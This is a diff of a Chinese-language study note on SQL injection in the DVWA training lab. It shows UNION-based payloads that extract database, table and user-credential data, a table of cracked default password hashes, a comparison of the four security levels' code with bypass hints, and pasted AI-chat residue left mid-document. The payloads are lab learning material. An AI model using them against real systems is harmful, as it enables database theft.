@@ -1,111 +1,100 @@
-# SQL Injection
-## HTML代码(网页代码)
-        <form action="#" method="GET">
-			<p>
-				User ID:
-				<input type="text" size="15" name="id">
-				<input type="submit" name="Submit" value="Submit">
-			</p>
+# DVWA SQL注入 - Low级别实战记录
 
-		</form>
+## 环境信息
+- 靶场：DVWA 
+- 安全级别：Low
+- 时间：2026-04-08
+- 攻击者：本地测试
 
-✨ action="#",将数据提交到当前页面
+## 攻击流程
 
-# DVWA SQL注入漏洞分析（Low级别）
+### Step 1: 确认注入点
+**输入**：`1'`
+**结果**：SQL语法错误（截图保存）
+**分析**：单引号破坏SQL语句结构，证明存在字符型注入漏洞
 
-## 1. 漏洞概述
-**SQL注入**是一种将恶意SQL代码插入到应用程序的输入参数中，从而在后台数据库执行这些恶意代码的攻击技术。DVWA（Damn Vulnerable Web Application）的Low级别中，用户输入未经过任何过滤直接拼接到SQL语句，导致严重的SQL注入漏洞。
+### Step 2: 获取数据库信息
+**输入**：`1' UNION SELECT user(),database()#`
+**结果**：
+- 当前用户：dvwa@localhost
+- 当前数据库：dvwa
 
-## 2. 漏洞代码分析
+### Step 3: 获取数据库表名
+**输入**：`1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()#`
+**发现的关键表**：users（存储用户账号）
 
-### 表格 1: 主程序流程分析
-| 代码行 | 代码 | 描述 | 安全问题 |
-| :--- | :--- | :--- | :--- |
-| **1-3** | `if( isset( $_REQUEST[ 'Submit' ] ) ) {` | 检查表单是否提交 | 无 |
-| **4-5** | `$id = $_REQUEST[ 'id' ];` | 直接获取用户输入的id参数 | ❌ **高危**：无任何过滤 |
-| **8-9** | `$query = "SELECT ... WHERE user_id = '$id';"` | SQL查询字符串拼接 | ❌ **注入点**：用户输入直接拼接 |
+### Step 4: 获取用户账号密码
+**输入**：`1' UNION SELECT user,password FROM users#`
+**窃取的数据**：
 
-### 表格 2: MySQL分支漏洞详情
-| 代码部分 | 功能 | 风险等级 | 修复建议 |
-| :--- | :--- | :--- | :--- |
-| `mysqli_query(...) or die(...)` | 执行SQL查询 | 🔴 **高危** | 1. 使用预处理语句<br>2. 禁止显示详细错误 |
-| `while( $row = mysqli_fetch_assoc(...))` | 遍历查询结果 | 🟢 **安全** | 正常数据处理逻辑 |
-| 错误信息输出 | 显示数据库错误 | 🟡 **中危** | 生产环境应隐藏错误详情 |
+| 用户名 | 密码哈希 | 明文密码（MD5破解） |
+|--------|---------|-------------------|
+| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
+| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
+| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
+| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
+| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
 
-### 表格 3: SQLite分支对比
-| 特性 | MySQL版本 | SQLite版本 | 差异说明 |
-| :--- | :--- | :--- | :--- |
-| **连接方式** | `$GLOBALS["___mysqli_ston"]` | `$sqlite_db_connection` | 全局变量名不同 |
-| **查询执行** | `mysqli_query()` | `$sqlite_db_connection->query()` | 面向过程 vs 面向对象 |
-| **错误处理** | `or die()`直接输出 | `try-catch`异常捕获 | SQLite错误处理更规范 |
-| **结果获取** | `mysqli_fetch_assoc()` | `$results->fetchArray()` | API接口不同 |
+### 漏洞根源
+查看源码（路径根据实际情况）：
+```bash
+cat /var/www/html/DVWA/vulnerabilities/sqli/source/low.php
 
-## 3. 漏洞利用方法
+核心漏洞代码：
+$id = $_REQUEST['id'];
+$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
 
-### 表格 4: 常见注入Payload
-| 攻击类型 | 输入示例 | 生成的SQL语句 | 攻击效果 |
-| :--- | :--- | :--- | :--- |
-| **永真条件** | `1' OR '1'='1` | `...WHERE user_id = '1' OR '1'='1'` | 返回所有用户数据 |
-| **联合查询** | `1' UNION SELECT user, password FROM users-- ` | `...WHERE user_id = '1' UNION SELECT user, password FROM users-- '` | 获取其他表数据 |
-| **注释绕过** | `1'-- ` | `...WHERE user_id = '1'-- '` | 注释掉后续代码 |
-| **错误注入** | `1' AND 1=convert(int,@@version)--` | `...WHERE user_id = '1' AND 1=convert(int,@@version)--'` | 获取数据库信息 |
+问题：直接拼接用户输入$id，未做任何过滤或参数化。
 
-## 4. 修复方案对比
+## 防御机制源码对比
 
-### 表格 5: 安全修复方案
-| 方案 | 实现方法 | 优点 | 缺点 |
-| :--- | :--- | :--- | :--- |
-| **预处理语句** | 使用参数化查询分离数据与SQL逻辑 | 1. 彻底防止SQL注入<br>2. 代码清晰易维护 | 1. 需修改代码结构<br>2. 学习曲线稍高 |
-| **输入过滤** | 对用户输入进行验证和过滤 | 1. 简单易实现<br>2. 可结合业务逻辑 | 1. 可能被绕过<br>2. 需针对不同类型处理 |
-| **最小权限** | 数据库用户使用最小必要权限 | 1. 限制攻击影响范围<br>2. 符合安全最佳实践 | 1. 权限配置复杂<br>2. 需DBA配合 |
+通过对比四个级别的源码，清晰看到防御措施的演进：
 
-## 5. 修复代码示例
+### Low级别（无防御）
+```php
+$id = $_REQUEST['id'];  // 接受GET/POST/COOKIE任意来源
+$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+// 直接拼接，无任何过滤
+这是四个级别的核心差异！你已经抓住了关键。让我帮你整理成清晰的对比表格，直接写进文档。
+四个级别的核心防御机制对比
+表格
+级别	输入方式	核心防御代码	漏洞点	绕过难度
+Low	$_REQUEST['id']	直接拼接SQL	无过滤，任意字符注入	⭐ 极易
+Medium	$_POST['id']	mysql_real_escape_string()	转义单引号，但数字型注入仍可	⭐⭐ 中等
+High	$_SESSION['id']	预处理语句 + LIMIT 1	会话控制，但单条数据仍可注入	⭐⭐⭐ 较难
+Impossible	严格类型检查	预处理 + CSRF Token + 强制整型	无漏洞	❌ 无法绕过
+现在立即写进文档（19:06-19:20）
+在VS Code里，文档末尾添加：
+Markdown
+复制
+代码
+预览
+## 防御机制源码对比
 
-### 方案1: 使用预处理语句（MySQL）
-  $stmt = $GLOBALS["___mysqli_ston"]->prepare    ("SELECT first_name, last_name FROM users WHERE user_id = ?");
-$stmt->bind_param("s", $id);
-$stmt->execute();
-$result = $stmt->get_result();
+通过对比四个级别的源码，清晰看到防御措施的演进：
 
-while( $row = $result->fetch_assoc() ) {
-    $first = $row["first_name"];
-    $last  = $row["last_name"];
-    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+### Low级别（无防御）
+```php
+$id = $_REQUEST['id'];  // 接受GET/POST/COOKIE任意来源
+$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+// 直接拼接，无任何过滤
+漏洞：任意SQL注入，可读取/修改任意数据
+
+### Medium级别（转义防御）
+$id = $_POST['id'];  // 仅接受POST，但前端是下拉框，需抓包绕过
+$id = mysql_real_escape_string($id);  // 转义特殊字符
+绕过方法：使用十六进制编码或数字型注入（无需引号）
+
+### High级别（会话+预处理）
+// 从Session获取，限制单条返回
+$id = $_SESSION['id'];
+$query = "SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;";
+局限：单次只能查一条，但仍可通过盲注逐条获取
+
+### Impossible级别（安全实践）
+// 强制类型检查 + 预处理 + CSRF防护
+if(!is_numeric($id)) {
+    exit("Invalid ID");
 }
-
-  $stmt->close();
-
-### 方案2: 输入过滤（简单场景）
-if($id <= 0) {
-    echo "Invalid ID";
-    exit();
-}
-
-$query  = "SELECT first_name, last_name FROM users WHERE user_id = " . $id . ";";
-$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>Database error</pre>' );
-
-// ... 其他代码
-
-## 6. 防御建议
-1. **始终使用预处理语句**或参数化查询
-2. **对用户输入进行严格验证**，使用白名单机制
-3. **实施最小权限原则**，数据库用户只拥有必要权限
-4. **隐藏详细错误信息**，生产环境禁用详细错误显示
-5. **定期进行安全审计**和代码审查
-6. **使用Web应用防火墙(WAF)** 作为额外防护层
-
-## 7. 漏洞影响等级
-| 风险类型 | 影响程度 | 修复优先级 |
-| :--- | :--- | :--- |
-| **数据泄露** | 🔴 高 | 立即修复 |
-| **数据篡改** | 🔴 高 | 立即修复 |
-| **权限提升** | 🟡 中 | 高优先级 |
-| **系统信息泄露** | 🟡 中 | 中优先级 |
-
----
-
-**分析日期**: 2026年1月22日  
-**安全等级**: 高危  
-**修复状态**: 未修复  
-
-
+$stmt = $pdo->prepare("SELECT ... WHERE user_id = ?");
+$stmt->execute([$id]);
